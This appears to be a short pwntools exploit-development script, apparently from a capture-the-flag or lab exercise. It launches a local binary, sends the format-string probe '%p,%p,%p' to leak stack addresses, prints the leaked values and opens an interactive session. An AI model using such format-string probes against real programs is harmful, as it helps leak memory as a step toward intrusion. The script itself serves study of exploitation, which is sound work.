#!/usr/bin/env python2
from pwn import *
import struct
elf = ELF('./app')
io = elf.process()
raw_input('Press return to continue...')
io.recvregex(b':') # read until we get the prompt
info('Format string sending…')
io.sendline(b'%p,%p,%p')
io.recvline()
print(io.recvline())
io.interactive()
